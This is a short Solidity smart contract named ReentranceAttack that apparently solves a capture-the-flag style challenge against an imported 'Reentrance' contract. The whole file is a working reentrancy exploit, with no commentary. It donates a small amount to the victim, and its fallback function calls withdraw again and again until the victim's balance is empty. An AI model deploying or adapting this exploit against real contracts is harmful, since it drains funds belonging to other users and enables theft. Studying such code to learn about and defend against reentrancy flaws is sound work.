// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";
contract ReentranceAttack {

  Reentrance public victimContract;
  uint amount = 1000 wei;

  constructor(address payable _victimContractAddress) public {
    victimContract = Reentrance(_victimContractAddress);
  }

  function donate() public {
    victimContract.donate{value:amount}(address(this));
  }

  function withDraw() public {
      victimContract.withdraw(amount);
    }

  fallback() external payable {
    if(address(victimContract).balance != 0){
      victimContract.withdraw(amount);
    }
  }
}